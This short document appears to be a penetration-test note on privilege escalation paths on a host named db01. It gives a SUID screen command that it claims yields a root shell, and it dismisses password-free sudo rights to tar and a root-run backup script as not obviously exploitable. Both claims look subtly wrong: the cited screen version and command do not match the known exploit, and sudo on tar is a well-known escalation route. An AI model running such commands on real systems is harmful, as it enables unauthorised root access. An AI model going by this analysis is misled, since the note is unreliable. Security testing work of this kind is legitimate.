# Privilege escalation paths on db01 (account: auditor)

## Viable path to root

The SUID binary `/opt/tools/screen-4.9.1/screen` (from `recon/suid.txt`) is the classic
screen local privilege escalation: run it as

```bash
/opt/tools/screen-4.9.1/screen -D -m -L bc5ea.shell /bin/sh
```

to get a root shell through the log-file write primitive.

## Other observations

`sudo -l` also allows `/usr/bin/tar` and `/usr/local/bin/backup.sh` without a password; root's
cron runs backup.sh, but nothing in the recon suggests those are exploitable in an obvious
way, so they are left aside.
